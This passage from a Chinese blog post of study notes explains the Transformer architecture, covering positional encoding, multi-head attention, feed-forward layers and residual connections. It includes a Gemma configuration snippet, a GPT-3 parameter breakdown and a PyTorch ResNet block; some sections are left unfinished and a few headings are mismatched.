论文中提出，因其具有能够有效捕捉长距离的依赖关系的能力，迅速成为自然语言处理（LLM）和计算机视觉（CV）任务的标准架构。</p>\n<blockquote>\n<p>文字数字化、位置向量化、语义关系化、预测概率化<br>多头注意力机制，就是能力更强的 CNN，其中词向量的维度就是 CNN 的通道，多头对应的就是卷积核<br>词向量采用了<strong>绝对</strong>位置的编码信息（基于加法进行矩阵修饰），而注意力机制采用了<strong>相对位置</strong>的编码信息<br>最后的 Liner 就是对前面的词向量进行一个线性运算，训练时变换称为计算损失值的形式，推理时变换为独热编码，以判断哪个 Token 的概率最大</p>\n</blockquote>\n<p>位置编码的要求：</p>\n<ul>\n<li>每个单词的TOken都能包含它的位置信息</li>\n<li>模型可以看到文字之间的距离</li>\n<li>模型可看懂并学习到位置编码的规则</li>\n</ul>\n<p>QKV就是在token原有客观语义的基础上，增加 context 代表的主观语义（嵌入向量，word embedding）进行修正，例如校准多义词的具体含义<br>WQ、WK、WV是增加了一些参数，如果没有他们，就是$XX^TT$ 也是可以表达自注意力，但是表达能力弱一点<br>单头QKV情况下，WV是一个（dmodel，dmodel）的矩阵，为了减少数据量 ，可以将其转化为（dmode，x）乘以（x，dmodl），即降秩+升秩；在多头情况下，WV是 nhead 个（dmodel，dhead&#x3D;dmodel&#x2F;nhead）的矩阵，然后连接起来与WO（dhead，dmodel）相乘，最终得到输出矩阵（ctx-lenght，dmodel）。上述两个方法在数学上是等价的。</p>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Transformer 总体架构可分为四个部分：输入、输出、编码器、解码器。</p>\n<p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/transformer-c.png\" alt=\"tr\"></p>\n<ol>\n<li>输入部分：<ul>\n<li>源文本嵌入层（Inputs Embedding），及其位置编码器（Positional Encoding）</li>\n<li>目标文本嵌入层（Outputs Embedding），及其位置编码器（Positional Encoding）</li>\n</ul>\n</li>\n<li>输出部分:<ul>\n<li>线性层</li>\n<li>softmax层</li>\n</ul>\n</li>\n<li>编码器部分：<ul>\n<li>由 N 个编码器层堆叠而成，每个编码器层由 2 个<strong>子层</strong>连接结构组成</li>\n<li>第一个子层连接结构包括：一个多头自注意力子层，规范化层，一个残差连接</li>\n<li>第二个子层连接结构包括：一个前馈全连接子层，规范化层，一个残差连接</li>\n</ul>\n</li>\n<li>解码器部分:<ul>\n<li>由 N 个解码器层堆叠而成，每个解码器层由 3 个<strong>子层</strong>连接结构组成</li>\n<li>第一个子层连接结构包括：一个<strong>Masked</strong>多头自注意力子层，规范化层，一个残差连接</li>\n<li>第二个子层连接结构包括：一个多头注意力子层（<strong>不是自注意力</strong>），规范化层，一个残差连接</li>\n<li>第三个子层连接结构包括：一个前馈全连接子层，规范化层，一个残差连接</li>\n</ul>\n</li>\n</ol>\n<p>尽管存在许多堆叠的技术组件，但基本构成就是几种：文本嵌入组件+位置编码器、多头注意力组件、前馈全连接组件、残差组件、规范化组件。</p>\n<h2 id=\"二、Position-Embedding-位置嵌入\"><a href=\"#二、Position-Embedding-位置嵌入\" class=\"headerlink\" title=\"二、Position Embedding - 位置嵌入\"></a>二、Position Embedding - 位置嵌入</h2><p>对于 Inputs 和 Outputs 的输入序列来说，仅仅完成词向量的 tokenlized 是不够的（例如“温州的气温是多少度”，两个“温”字的词向量完全相同，但其实际含义完全不同），因此我们需要为词向量添加位置信息。</p>\n<p>一般来说，位置编码与嵌入具有相同的维数模型，Transformer 建议采用“矩阵加法”实现，数值则使用了不同频率的正弦和余弦函数，数学表示为：</p>\n<p>$$ \\begin{align*}<br>    PE_{(pos,2i)} &amp;&#x3D; sin(pos&#x2F;10000^{2i&#x2F;d_{model}}) \\\\<br>    PE_{(pos,2i+1)} &amp;&#x3D; cos(pos&#x2F;10000^{2i&#x2F;d_{model}})<br>    \\end{align*}<br>$$<br>其中，$pos$ 定义了位置，$i$ 定义了维度。</p>\n<p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/PE.png\" alt=\"PE\"></p>\n<h2 id=\"三、Multi-Head-Attention-多头注意力\"><a href=\"#三、Multi-Head-Attention-多头注意力\" class=\"headerlink\" title=\"三、Multi-Head Attention - 多头注意力\"></a>三、Multi-Head Attention - 多头注意力</h2><p>在传统的循环神经网络（RNN）和长短期记忆网络（LSTM）中，处理长距离依赖可能非常困难，因为信息需要通过许多时间步长传递。自注意力机制可以直接捕捉序列中任意两个位置之间的依赖关系，无论它们之间的距离有多远，因此成为 Transformer 最关键的技术改进点！！！</p>\n<h3 id=\"1-数学定义\"><a href=\"#1-数学定义\" class=\"headerlink\" title=\"1. 数学定义\"></a>1. 数学定义</h3><p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/attention.png\" alt=\"attention\"></p>\n<p>最基础的注意力结构是 Scaled Dot-Product Attention（缩放点积注意力，即单头注意力），数学表达为：<br>$$Attention(Q,K,V) &#x3D; softmax(\\frac {QK^T}{\\sqrt {d_k}})V$$</p>\n<p>其中：$\\sqrt {d_k}$ 代表了 Scale（缩放），Softmax 就是概率的归一化，此外有可能需要采用 Mask（掩码）。</p>\n<p>Multi-Head Attention（多头注意力）是 Scaled Dot-Product Attention 的扩展，数学表达为：<br><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/attention-2.png\" alt=\"multi\"></p>\n<p>相比单头注意力机制，多头注意力机制（Multi-Head Attention）具有以下优势：</p>\n<ul>\n<li>多头注意力允许模型在多个不同的表示子空间（分别关注输入序列的不同方面，例如，一个头可能关注句法信息，而另一个头可能关注语义信息）中并行地捕获信息，这增加了模型的表示能力，使其能够同时学习到输入数据的多种特征。</li>\n<li>多头注意力的计算是高度并行的，这使得模型可以高效地利用 GPU 进行快速训练。</li>\n<li>多头注意力可以帮助模型在面对不完整或嘈杂的数据时更加鲁棒，因为不同的头可以捕捉到不同的信息，从而减少对单一特征的依赖，同时也有助于提高模型的泛化能力</li>\n<li>调整头的数量可以控制模型的复杂性和容量。更多的头可以提供更细粒度的分析，但也增加了计算成本。</li>\n</ul>\n<h3 id=\"2-具体实现\"><a href=\"#2-具体实现\" class=\"headerlink\" title=\"2. 具体实现\"></a>2. 具体实现</h3><p>观察上面的 Transformer 结构图，可以发现 3 个不同的多头注意力子层：</p>\n<ol>\n<li>encoder-decoder cross-attention：模仿了机器翻译的交叉注意力机制，Query 来自于解码器的前一层，Key 和 Value 来自于编码器的输出。注意输入顺序是<strong>V、K、Q</strong>！</li>\n<li>encoder self-attention：标准的自注意力机制，Q、K、V 都来自于编码器的前一层输出。</li>\n<li>decoder masked self-attention：带掩码的自注意力机制，以确保解码器的 auto-regressive 自回归特性（即在生成每个位置时，只能看到它之前的位置，而不能“看到”未来的位置）。实现方法是将矩阵对角线以上部分的所有值设为 $-\\infty$</li>\n</ol>\n<h3 id=\"3-物理意义\"><a href=\"#3-物理意义\" class=\"headerlink\" title=\"3. 物理意义\"></a>3. 物理意义</h3><p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/qkv-2.png\" alt=\"交叉注意力\"></p>\n<ul>\n<li>词向量已经提供了基于字典表的、单个 token 的<strong>客观语义</strong>，自注意力机制的目的是提供基于当前上下文的、token 之间的<strong>主观语义</strong>，并据此对输入向量进行修正。</li>\n<li>与基于直线的线形变换相比，矩阵二次型实际上是基于圆锥曲线的高维变换，因此有着更强的表达能力。<br>  $$ A &#x3D; X \\cdot W_Q \\cdot [X \\cdot W_K]^T &#x3D; X \\cdot [W_Q \\cdot W_K^T] \\cdot X^T &#x3D; X \\cdot W_A \\cdot X^T $$</li>\n<li>Q 表示查询向量，K 表示关键字向量，V 表示值向量。可以认为，$Q$ 和 $K$ 分别负责<strong>设定语义</strong>和<strong>表达语义</strong>。</li>\n</ul>\n<p>换个角度看，就是：<br><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/attention-3.png\" alt=\"attention\"></p>\n<h3 id=\"4-后续改进\"><a href=\"#4-后续改进\" class=\"headerlink\" title=\"4. 后续改进\"></a>4. 后续改进</h3><p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/MQA.png\" alt=\"VS\"></p>\n<p>MHA（Multi-head Attention）是标准的多头注意力机制，包含 H 个Query、Key 和 Value 矩阵。所有注意力头的 Key 和 Value 矩阵权重不共享。</p>\n<p>MQA（Multi-Query Attention，多查询注意力）是 19 年提出的一种 Attention 机制，其能够在保证模型效果的同时加快 decoder 生成 token 的速度。MQA 是将 head 中的 key 和 value 矩阵抽出来单独存为一份共享参数，而 query 则是依旧保留在原来的 head 中，每个 head 有一份自己独有的 query 参数。</p>\n<p>GQA（Grouped-Query Attentio，分组查询注意力）是一种针对 Transformer 模型中 Multi-head Attention 的改进方法，旨在提高模型的运算速度，同时保持预测质量。在标准的Multi-head Attention中，每个注意力头都是独立计算的，这导致了计算和存储需求较高。分组查询注意力通过将查询头分组，让每组共享一个键头和值头，从而减少计算和存储需求。</p>\n<p>MQA 和 MHA 主要是在计算 K 和 V 的过程中有计算量的差异，由于训练阶段由于数据是并行的，这种差异整体不明显，而在推理阶段，在 memery cache的基础上，MQA 的推理速度有明显提升，同时也更省内存。</p>\n<h2 id=\"四、Feed-Forward-Network-前馈网络\"><a href=\"#四、Feed-Forward-Network-前馈网络\" class=\"headerlink\" title=\"四、Feed Forward Network - 前馈网络\"></a>四、Feed Forward Network - 前馈网络</h2><p>在 Transformer 模型中，每层编码器和解码器都包含一个前馈网络（Feed-Forward Network，FFN），负责在注意力机制的基础上进一步提取特征，增加模型的表达能力。<br>$$ FFN(x) &#x3D; \\max(0,xW_1+b_1)W_2+b_2$$</p>\n<p>前馈网络包含两个线性变换（也称为全连接层或线性层），不同层使用不同的参数。尽管每个位置使用的线性变换形式相同，但是不同层之间的参数是不同的。这意味着每一层都有自己的权重矩阵和偏置项。<br>这种结构也可以被看作是两次具有核大小为 1 的卷积操作。这里的“卷积”是指在输入序列上应用线性滤波器，但由于核大小为1，它实际上等同于全连接层。</p>\n<p>输入和输出的维度都是 $d_{model}$，中间层的维度是 $d_{ff}$（一般设定为 $d_{model}$ 的 4 倍），激活函数建议使用 ReLU。</p>\n<h2 id=\"五、其他组件\"><a href=\"#五、其他组件\" class=\"headerlink\" title=\"五、其他组件\"></a>五、其他组件</h2><h3 id=\"2-规范化组件\"><a href=\"#2-规范化组件\" class=\"headerlink\" title=\"2. 规范化组件\"></a>2. 规范化组件</h3><h3 id=\"3-残差连接组件\"><a href=\"#3-残差连接组件\" class=\"headerlink\" title=\"3. 残差连接组件\"></a>3. 残差连接组件</h3><hr>\n<h2 id=\"附录一：Gemma-7B-对比分析\"><a href=\"#附录一：Gemma-7B-对比分析\" class=\"headerlink\" title=\"附录一：Gemma 7B 对比分析\"></a>附录一：Gemma 7B 对比分析</h2><p>以 LLaMA-2 7B 为例，分析其配置文件</p>\n<p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/arch.jpg\" alt=\"arch\"></p>\n<p>与最近大语言模型的研究趋势一致，我们的网络也基于 Transformer 架构（Vaswani 等，2017）。 但做了很多改进，也借鉴了其他模型（例如 PaLM）中的一些技巧。</p>\n<p>2.2.1 改进<br>以下是与原始架构的主要差异，</p>\n<p>预归一化（Pre-normalization）：受 GPT3 启发<br>为了提高训练稳定性，我们对每个 Transformer sub-layer 的输入进行归一化，而不是对输出进行归一化。 这里使用由 Zhang 和 Sennrich（2019）提出的 RMSNorm 归一化函数。</p>\n<p>SwiGLU 激活函数：受 PaLM 启发<br>用 SwiGLU 激活函数替换 ReLU 非线性，该函数由 Shazeer（2020）提出，目的是提升性能。 但我们使用的维度是 2&#x2F;3 * 4d，而不是 PaLM 中的 4d。</p>\n<p>旋转嵌入（Rotary Embeddings）：受 GPTNeo 启发<br>去掉了绝对位置嵌入（absolute positional embeddings），并在每个网络层中添加旋转位置嵌入（rotary positional embeddings，RoPE）。 RoPE 由 Su 等（2021）提出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 词汇表的大小：The number of tokens in the vocabulary.</span></span><br><span class=\"line\">vocab_size: <span class=\"built_in\">int</span> = <span class=\"number\">256000</span></span><br><span class=\"line\"><span class=\"comment\"># The maximum sequence length that this model might ever be used with.</span></span><br><span class=\"line\">max_position_embeddings: <span class=\"built_in\">int</span> = <span class=\"number\">8192</span></span><br><span class=\"line\"><span class=\"comment\"># 28 个隐藏层：The number of blocks in the model.</span></span><br><span class=\"line\">num_hidden_layers: <span class=\"built_in\">int</span> = <span class=\"number\">28</span></span><br><span class=\"line\"><span class=\"comment\"># 16 个注意力 head ：The number of attention heads used in the attention layers of the model.</span></span><br><span class=\"line\">num_attention_heads: <span class=\"built_in\">int</span> = <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"comment\"># The number of key-value heads for implementing attention.</span></span><br><span class=\"line\">num_key_value_heads: <span class=\"built_in\">int</span> = <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"comment\"># The hidden size of the model.</span></span><br><span class=\"line\">hidden_size: <span class=\"built_in\">int</span> = <span class=\"number\">3072</span></span><br><span class=\"line\"><span class=\"comment\"># The dimension of the MLP representations.</span></span><br><span class=\"line\">intermediate_size: <span class=\"built_in\">int</span> = <span class=\"number\">24576</span></span><br><span class=\"line\"><span class=\"comment\"># The number of head dimensions.</span></span><br><span class=\"line\">head_dim: <span class=\"built_in\">int</span> = <span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"comment\"># The epsilon used by the rms normalization layers.</span></span><br><span class=\"line\">rms_norm_eps: <span class=\"built_in\">float</span> = <span class=\"number\">1e-6</span></span><br><span class=\"line\"><span class=\"comment\"># The dtype of the weights.</span></span><br><span class=\"line\">dtype: <span class=\"built_in\">str</span> = <span class=\"string\">&#x27;bfloat16&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># Whether a quantized version of the model is used.</span></span><br><span class=\"line\">quant: <span class=\"built_in\">bool</span> = <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"comment\"># The path to the model tokenizer.</span></span><br><span class=\"line\">tokenizer: <span class=\"type\">Optional</span>[<span class=\"built_in\">str</span>] = <span class=\"string\">&#x27;tokenizer/tokenizer.model&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>词汇表的容量：256K</li>\n<li>隐藏层的数量：28</li>\n<li>隐藏层的维度：3072</li>\n<li>自注意力 head 的数量：16</li>\n</ul>\n<hr>\n<h2 id=\"三、GPT-3-模型的参数构成分析\"><a href=\"#三、GPT-3-模型的参数构成分析\" class=\"headerlink\" title=\"三、GPT-3 模型的参数构成分析\"></a>三、GPT-3 模型的参数构成分析</h2><p><a href=\"https://github.com/openai/gpt-3\">GPT-3</a> 是一个由 1750 亿个参数组成的语言模型，其 Transformer 架构仅包含解码器部分，预训练时将生成并<strong>固化</strong>所有 175B 个模型参数。<br>为了定义 GPT-3 模型的结构，其核心的超参数（无法通过训练调整的参数）包括：</p>\n<ul>\n<li>词向量维度：$d_{model}&#x3D;12288$，词汇表容量：$n_{vocab}&#x3D;50257$</li>\n<li>解码器层数：$n_{layers}&#x3D;96$</li>\n<li>注意力头数：$n_{heads}&#x3D;96$；相应得出查询向量维度：$d_k &#x3D; d_{model} \\div n_{heads} &#x3D; 12288 &#x2F; 96 &#x3D;128$，而且仅有解码器部分时，$d_v&#x3D;d_k$</li>\n<li>前馈神经元数量：$n_{neurons}&#x3D;49152$（经验表明，隐藏层神经元数量通常设置为输入层的 4 倍）</li>\n<li>上下文长度：$n_{ctx}&#x3D;2048$</li>\n<li>批次大小：Batch Size &#x3D; 3.2M</li>\n<li>学习率：Learning Rate &#x3D; $0.6 \\times 10^{-4}$</li>\n</ul>\n<p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/gpt3-2.png\" alt=\"GPT-3\"></p>\n<p>Inputs 作为原始语言输入，例如“大模型的三个要素是”包含了 9 个 token，是一个用户输入的、长度为 $length_{ctx}$ 的向量（当然 $length_{ctx} \\leqslant n_{ctx}$），后续就是其与包含大模型 175B 参数的若干个矩阵进行计算：</p>\n<ol>\n<li><p>1 个 $W_E(n_{vocab},d_{model})$：词向量嵌入矩阵，存储了所有词汇表及其维度信息。<br> 对用户输入进行向量化处理（Input Embedding），并嵌入位置信息（Positional Embedding）。<br> 输出一个形状为$(length_{ctx},d_{model})$ 的矩阵 $X$ 作为下一阶段的输入。</p>\n</li>\n<li><p>96 个多头注意力子层：包含了 96 个注意力头，每个注意力头包含 3 个矩阵</p>\n<ul>\n<li>$W_Q(d_{model},d_k)$：$Q&#x3D;XW_Q$</li>\n<li>$W_K(d_{model},d_k)$：$K&#x3D;XW_K$，<br> 计算自注意力矩阵$A(length_{ctx},length_{ctx}) &#x3D; QK^T$，softmax 归一化处理得到$A’$</li>\n<li>$W_V(d_{model},d_v)$：也称 Value Down 矩阵，$V&#x3D;XW_V$<br> 对于每个单头，分别计算 $O(length_{ctx}，d_v)&#x3D;A’V$</li>\n</ul>\n<p> 最后，$W_O(d_{model},d_{model})$：也称 Value UP 矩阵，目的是还原为 $d_{model}$ 维度<br> 把全部单头拼接起来形成$O’$，然后计算 $O’W_O$ 得到 $X’(length_{ctx}，d_{model})$</p>\n</li>\n<li><p>96 个前馈全联接子层：包含了 2 次线性变换，即图中的 <strong>Wff</strong></p>\n<ul>\n<li>$W_{Up}(d_{model},n_{neurons})$：$Up&#x3D;XW_{Up}$，维度从 $d_{model}$ 提升到 $d_{neurons}$</li>\n<li>$W_{Down}(n_{neurons},d_{model})$：$X’’&#x3D;Down&#x3D;UpW_{Down}$，维度从 $d_{neurons}$ 还原到 $d_{model}$</li>\n</ul>\n</li>\n<li><p>1 个Unembedding Matrix $(n_{model},d_{vocab})$：即图中的 <strong>Wp&#x2F;WU</strong>，与WE相似，但是行列顺序相反，目的是基于词向量维度，线性变换为词汇表，然后 Softmax 计算出每个词的概率，并选择概率最大的单词作为输出。</p>\n</li>\n</ol>\n<blockquote>\n<p>对于每一个可能的输出特征，在词典中对应的每一个文字，都有一个dmodel维度的权重向量</p>\n</blockquote>\n<p>汇总参数数量如下图，其中前馈全联接子层占比66%，自注意力子层占比33%，词汇表不足1%。<br><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/gpt3.png\" alt=\"GPT-3\"></p>\n<h3 id=\"1-Word-Embedding-Matrix（）\"><a href=\"#1-Word-Embedding-Matrix（）\" class=\"headerlink\" title=\"1. Word Embedding Matrix（）\"></a>1. Word Embedding Matrix（）</h3><h3 id=\"2-QKV-矩阵\"><a href=\"#2-QKV-矩阵\" class=\"headerlink\" title=\"2. QKV 矩阵\"></a>2. QKV 矩阵</h3><h3 id=\"3-Feed-Forward\"><a href=\"#3-Feed-Forward\" class=\"headerlink\" title=\"3. Feed Forward\"></a>3. Feed Forward</h3><p>输入数据为：</p>\n<ul>\n<li>$T_1$：基准输入数据，形状为 $(length_{ctx1}, d_{model})$</li>\n<li>$T_2$：对照输入数据，形状为 $(length_{ctx2}, d_{model})$</li>\n<li>如果是自注意力机制，则 $T_2&#x3D;T_1$</li>\n</ul>\n<p>注意力机制的层数是 $n_{layers}$，如果是单头注意力机制：</p>\n<ul>\n<li>1 个 $W_q$：Query 权重矩阵，形状为$(length_{ctx1}, d_{model})$</li>\n<li>1 个 $W_k$：Key 权重矩阵，形状为$(length_{ctx2},  d_{model})$</li>\n<li>1 个 $W_v$：Value 权重矩阵，形状为$(length_{ctx2}, d_{model})$</li>\n<li>中间结果 $A$ 的形状为 $(length_{ctx1}, length_{ctx2})$</li>\n</ul>\n<blockquote>\n<p>TODO: 3Blue1Brown 视频视频中说 Value 是 12288 * 12288 的矩阵，分解为 12288 * 128 乘以 128 * 12288 的矩阵乘法，参数分别是 value 和 output，与我的理解有差异！！！</p>\n</blockquote>\n<p>如果是多头注意力机制，则有$d_{head} &#x3D; d_{model} \\div n_{heads}$（也称为 d_query），相应的：</p>\n<ul>\n<li>$n_{heads}$ 个 $W_q$：Query 权重矩阵，形状为$(length_{ctx1}, d_{head})$</li>\n<li>$n_{heads}$ 个 $W_k$：Key 权重矩阵，形状为$(length_{ctx2},  d_{head})$</li>\n<li>$n_{heads}$ 个 $W_v$：Value 权重矩阵，形状为$(length_{ctx2}, d_{head})$</li>\n</ul>\n<p>输出数据的形状为 $(length_{ctx1}, d_{model})$，也就是与输入数据的形状完全系统。</p>\n<p>GPT-3 的前馈全联接子层包含 2 个串联的线性组件，分别是 Up-projection 和 Down—projection，主要参数是：</p>\n<ul>\n<li>Up-projection：输出数据的形状为 $(length_{ctx1}, d_{model})$，包含 $n_{neurons}$ 个神经元，输出数据的形状为 $(length_{ctx1}, n_{neurons})$</li>\n<li>Down—projection：输入就是 Up-projection 的输出，包含 $d_{model}$ 个神经元，输出数据的形状为 $(length_{ctx1}, d_{model})$</li>\n</ul>\n<hr>\n<h2 id=\"附录一：残差网络（ResNet）\"><a href=\"#附录一：残差网络（ResNet）\" class=\"headerlink\" title=\"附录一：残差网络（ResNet）\"></a>附录一：残差网络（ResNet）</h2><p>Residual Network（残差网络，ResNet）是一种深度卷积神经网络（CNN）架构，由 Kaiming He（何凯明）在 2015 年提出，核心思想是通过引入“残差学习”（residual learning）来解决深度神经网络训练中的退化问题（degradation problem）。</p>\n<p>在传统的深度神经网络中，随着网络层数的增加，理论上网络的表示能力应该更强，但实际上，过深的网络往往难以训练，性能反而不如层数较少的网络。这种现象被称为“退化问题”，即随着网络深度的增加，网络的准确率不再提升，甚至下降。<br><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/resnet0.png\" alt=\"error\"></p>\n<p>ResNet通过引入“跳跃连接”（skip connections）或“捷径连接”（shortcut connections）来解决这个问题。在ResNet中，输入不仅传递给当前层，还直接传递到后面的层，跳过一些中间层。这样，后面的层可以直接学习到输入与输出之间的残差（即差异），而不是学习到未处理的输入。这种设计允许网络学习到恒等映射（identity mapping），即输出与输入相同，从而使得网络可以通过更简单的路径来学习到正确的映射关系。</p>\n<p><img src=\"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/resnet.png\" alt=\"res\"></p>\n<p>在 Transformer 模型中，残差网络的使用主要是为了解决自注意力机制（self-attention）带来的问题。Transformer模型完全基于注意力机制，没有卷积层，但其结构本质上也是深度网络。在 Transformer 中，每个编码器（encoder）和解码器（decoder）层都包含自注意力和前馈网络，这些层的参数量非常大，网络深度也很容易变得很深。使用残差连接可以帮助Transformer模型更有效地训练深层网络。在 Transformer 的自注意力层中，输入通过自注意力和前馈网络后，与原始输入相加，形成残差连接。这种设计使得网络即使在增加更多层数时，也能保持较好的性能，避免了退化问题。</p>\n<p>参考<a href=\"https://zh.d2l.ai/chapter_convolutional-modern/resnet.html\">https://zh.d2l.ai/chapter_convolutional-modern&#x2F;resnet.html</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch.nn <span class=\"keyword\">import</span> functional <span class=\"keyword\">as</span> F</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Residual</span>(nn.Module):  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, input_channels, num_channels,</span></span><br><span class=\"line\"><span class=\"params\">                 use_1x1conv=<span class=\"literal\">False</span>, strides=<span class=\"number\">1</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>().__init__()</span><br><span class=\"line\">        self.conv1 = nn.Conv2d(input_channels, num_channels,</span><br><span class=\"line\">                               kernel_size=<span class=\"number\">3</span>, padding=<span class=\"number\">1</span>, stride=strides)</span><br><span class=\"line\">        self.conv2 = nn.Conv2d(num_channels, num_channels,</span><br><span class=\"line\">                               kernel_size=<span class=\"number\">3</span>, padding=<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> use_1x1conv:</span><br><span class=\"line\">            self.conv3 = nn.Conv2d(input_channels, num_channels,</span><br><span class=\"line\">                                   kernel_size=<span class=\"number\">1</span>, stride=strides)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.conv3 = <span class=\"literal\">None</span></span><br><span class=\"line\">        self.bn1 = nn.BatchNorm2d(num_channels)</span><br><span class=\"line\">        self.bn2 = nn.BatchNorm2d(num_channels)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">forward</span>(<span class=\"params\">self, X</span>):</span><br><span class=\"line\">        Y = F.relu(self.bn1(self.conv1(X)))</span><br><span class=\"line\">        Y = self.bn2(self.conv2(Y))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.conv3:</span><br><span class=\"line\">            X = self.conv3(X)</span><br><span class=\"line\">        Y += X</span><br><span class=\"line\">        <span class=\"keyword\">return</span> F.relu(Y)</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://arxiv.org/pdf/1706.03762\">Attention Is All You Need</a></li>\n</ul>\n<h3 id=\"视频教材\"><a href=\"#视频教材\" class=\"headerlink\" title=\"视频教材\"></a>视频教材</h3><ul>\n<li><a href=\"https://space.bilibili.com/88461692/channel/seriesdetail?sid=1528929\">Deep Learning 合集 - 3Blue1Brown</a></li>\n<li><a href=\"https://space.bilibili.com/504715181/channel/collectiondetail?sid=643185\">踏踏实实理解神经网络 - 王木头学科学</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1sW4y1J7cL/?spm_id_from=333.999.0.0&vd_source=735a6376f6214c7b974a1074096ba0fa\">认识Transformer架构和代码实现（合集）- 浙大教授</a></li>\n</ul>\n<h3 id=\"技术解读\"><a href=\"#技术解读\" class=\"headerlink\" title=\"技术解读\"></a>技术解读</h3><ul>\n<li><a href=\"https://jalammar.github.io/illustrated-transformer/\">Transformer 高级讲解 - Jay Alammar</a></li>\n<li><a href=\"https://juejin.cn/post/7243435843145924667\">想要更好地理解大模型架构？从计算参数量快速入手</a></li>\n<li><a href=\"https://www.cnblogs.com/hbuwyg/p/16978264.html\">Self-Attention：Learning QKV step by step</a></li>\n<li><a href=\"https://ziuch.com/article/Positional-Encoding-in-Transform\">Transformer中的位置编码</a></li>\n<li><a href=\"https://blog.csdn.net/m0_56192771/article/details/118087175\">Transformer架构解析</a></li>\n<li><a href=\"https://www.cnblogs.com/huaweiyun/p/17881295.html\">深入解析 LLaMA 如何改进 Transformer 的底层结构</a></li>\n</ul>\n<hr>\n<h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"gemma-report.pdf\">Gemma: Open Models Based on Gemini Research and Technology</a></li>\n<li><a href=\"https://github.com/google/gemma_pytorch\">Gemma Pytorch - Github</a></li>\n</ul>\n<h3 id=\"技术解读2\"><a href=\"#技术解读2\" class=\"headerlink\" title=\"技术解读2\"></a>技术解读2</h3><ul>\n<li><a href=\"https://blog.csdn.net/qinduohao333/article/details/136264993\">Gemma模型论文详解</a></li>\n<li><a href=\"https://juejin.cn/post/7310061802464264242\">LLM常见问题（Attention 优化部分）</a></li>\n</ul>\n<h3 id=\"LLAMA-解读\"><a href=\"#LLAMA-解读\" class=\"headerlink\" title=\"LLAMA 解读\"></a>LLAMA 解读</h3><ul>\n<li><a href=\"2302.13971v1.pdf\">LLaMA: Open and Efficient Foundation Language Models</a></li>\n<li><a 